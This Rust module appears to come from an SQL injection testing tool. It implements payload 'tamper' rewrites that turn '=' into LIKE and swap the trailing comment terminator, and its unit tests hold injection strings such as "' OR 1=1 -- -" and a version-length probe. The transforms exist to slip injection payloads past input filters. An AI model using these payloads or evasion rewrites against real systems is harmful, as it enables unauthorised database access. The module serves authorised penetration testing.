//! Operator/terminator signature rewrites (`equaltolike`, `linecomment`).

use super::space::split_trailing_comment;

/// `=` → ` LIKE `, except when part of `>=`, `<=`, `!=`, `<>`, `==`
/// (used by `LENGTH(...)>=N` extraction oracles). Keeps boolean
/// TRUE/FALSE coherent: `1=1` → `1 LIKE 1` (true), `1=2` → `1 LIKE 2` (false).
pub(super) fn apply_equal_to_like(payload: &str) -> String {
    let chars: Vec<char> = payload.chars().collect();
    let mut out = String::with_capacity(payload.len() + 8);
    for (i, &c) in chars.iter().enumerate() {
        if c != '=' {
            out.push(c);
            continue;
        }
        let prev = if i > 0 { Some(chars[i - 1]) } else { None };
        let next = chars.get(i + 1).copied();
        let is_comparison =
            matches!(prev, Some('>' | '<' | '!' | '=')) || matches!(next, Some('=' | '>'));
        if is_comparison {
            out.push('=');
        } else {
            out.push_str(" LIKE ");
        }
    }
    out
}

/// Seeded trailing line-comment swap. Without a `split_trailing_comment`
/// tail the payload is returned unchanged (still boolean-safe: both
/// branches stay distinct).
pub(super) fn apply_linecomment(payload: &str, rng: &mut impl rand::RngExt) -> String {
    static VARIANTS: &[&str] = &["--+", "%23", ";/*"];
    let (body, tail) = split_trailing_comment(payload);
    if tail.is_empty() {
        return payload.to_owned();
    }
    let variant = VARIANTS[rng.random_range(0..VARIANTS.len())];
    format!("{body}{variant}")
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use crate::techniques::tamper::Tamper;

    #[test]
    fn equaltolike_basic() {
        assert_eq!(
            Tamper::EqualToLike.apply("' OR 1=1 -- -"),
            "' OR 1 LIKE 1 -- -"
        );
        assert_eq!(
            Tamper::EqualToLike.apply("' OR 1=2 -- -"),
            "' OR 1 LIKE 2 -- -"
        );
    }

    #[test]
    fn equaltolike_preserves_comparison_operators() {
        assert_eq!(
            Tamper::EqualToLike.apply("' AND LENGTH((SELECT @@version))>=5 -- -"),
            "' AND LENGTH((SELECT @@version))>=5 -- -"
        );
        assert_eq!(Tamper::EqualToLike.apply("a<=b"), "a<=b");
        assert_eq!(Tamper::EqualToLike.apply("a!=b"), "a!=b");
        assert_eq!(Tamper::EqualToLike.apply("a==b"), "a==b");
    }

    #[test]
    fn linecomment_swaps_terminator_seeded() {
        use crate::seeded_rng::make_rng;
        use std::collections::HashSet;
        let mut seen = HashSet::new();
        for seed in 1..=12 {
            let mut rng = make_rng(Some(seed));
            let out = Tamper::LineComment.apply_with_rng("' OR 1=1 -- -", &mut rng);
            assert!(out.contains("1=1"), "body preserved: {out}");
            assert!(!out.contains("-- -"), "old terminator must go: {out}");
            let tail_ok = out.ends_with("--+") || out.ends_with("%23") || out.ends_with(";/*");
            assert!(tail_ok, "unexpected terminator: {out}");
            seen.insert(out[out.len().saturating_sub(3)..].to_owned());
        }
        assert!(seen.len() >= 2, "seeded variants should vary: {seen:?}");
    }

    #[test]
    fn linecomment_no_tail_is_noop() {
        // No trailing comment: nothing to swap, payload untouched.
        assert_eq!(Tamper::LineComment.apply("nospace"), "nospace");
        assert_eq!(Tamper::LineComment.apply("' OR 1=1"), "' OR 1=1");
    }

    #[test]
    fn linecomment_same_seed_identical() {
        use crate::seeded_rng::make_rng;
        let mut a = make_rng(Some(5));
        let mut b = make_rng(Some(5));
        assert_eq!(
            Tamper::LineComment.apply_with_rng("' OR 1=1 -- -", &mut a),
            Tamper::LineComment.apply_with_rng("' OR 1=1 -- -", &mut b)
        );
    }
}
